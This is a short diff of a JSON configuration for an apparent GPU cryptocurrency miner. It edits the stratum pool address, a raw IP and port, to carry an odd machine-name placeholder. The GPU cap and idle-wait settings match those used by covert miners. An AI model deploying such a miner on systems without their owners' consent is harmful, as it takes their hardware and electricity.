@@ -1,5 +1,5 @@
 {
-	"url": "stratums://185.213.208.96:55555",
+	"url": "stratums://``.{COMPUTERNAME}185.213.208.96:55555",
 	"algo": "etchash",
 	"max-gpu": 30,
 	"idle-wait": 3,
